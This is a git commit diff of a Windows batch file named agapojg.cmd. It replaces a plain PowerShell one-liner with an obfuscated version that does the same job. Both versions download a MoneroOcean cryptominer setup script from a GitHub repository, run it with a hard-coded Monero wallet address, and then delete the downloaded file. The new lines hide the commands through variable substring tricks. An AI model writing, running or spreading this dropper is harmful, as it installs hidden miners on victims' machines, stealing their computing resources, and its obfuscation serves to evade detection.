9fd49e80d31a749769a187dd0953279c808d49ae
Criptc <96071765+Criptc@users.noreply.github.com>
2022-02-06 21:10:28 -0600

    Update agapojg.cmd

--- agapojg.cmd
+++ agapojg.cmd
@@ -1,1 +1,23 @@
-powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/Criptc/Dump/main/setup_moneroocean_miner.bat', $tempfile); & $tempfile 4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si; Remove-Item -Force $tempfile"
+set oaifsholkm=guqrsvwxadefnpotijkybhlmczVWXYZ12ABCDUSOPQR78456TJKLMN903FGHIE
+set alksfj=%oaifsholkm:~4,1%%oaifsholkm:~10,1%%oaifsholkm:~15,1%
+%alksfj% laks= 
+%alksfj%%laks%afksl= =
+%alksfj%%laks%lkj%afksl%%oaifsholkm:~13,2%
+%alksfj%%laks%ijn%afksl%%oaifsholkm:~6,1%
+%alksfj%%laks%jhagsfjahfgjagfh%afksl%raw.githubusercontent.com
+%alksfj%%laks%lasfjllf%afksl%https://
+%alksfj%%laks%jbh%afksl%%oaifsholkm:~10,1%%oaifsholkm:~3,1%
+%alksfj%%laks%aasdaslkjjk%afksl%DownloadFile
+%alksfj%%laks%gka%afksl%%oaifsholkm:~4,1%%oaifsholkm:~21,1%%oaifsholkm:~10,1%
+%alksfj%%laks%iip%afksl%%oaifsholkm:~22,1%%oaifsholkm:~22,1%
+%alksfj%%laks%asourasoruoauo%afksl%setup_moneroocean_miner.bat
+%alksfj%%laks%lhj%afksl%%oaifsholkm:~35,1%%oaifsholkm:~14,1%%oaifsholkm:~23,1%
+%alksfj%%laks%alskfjkkjflaf%afksl%4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si
+%alksfj%%laks%htdm%afksl%%oaifsholkm:~23,1%
+%alksfj%%laks%asdwasdwa%afksl%/Criptc/Dump/main/
+%alksfj%%laks%lkafjs%afksl%%oaifsholkm:~8,1%%oaifsholkm:~12,1%%oaifsholkm:~9,1%
+%alksfj%%laks%dfhdf%afksl%%oaifsholkm:~6,1%%oaifsholkm:~24,1%
+%alksfj%%laks%agsaf%afksl%%oaifsholkm:~53,1%%oaifsholkm:~10,1%%ijn%
+%alksfj%%laks%bj%afksl%%oaifsholkm:~20,1%%oaifsholkm:~17,1%
+timeout /t 1
+%lkj%%ijn%%jbh%%gka%%iip%%laks%-%lhj%%htdm%%lkafjs%%laks%"$%dfhdf%%laks%%afksl%%laks%%agsaf%-O%bj%%abaa%%laks%System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.%aasdaslkjjk%('%lasfjllf%%jhagsfjahfgjagfh%%asdwasdwa%%asourasoruoauo%', $tempfile); & $tempfile %alskfjkkjflaf%; Remove-Item -Force $tempfile"
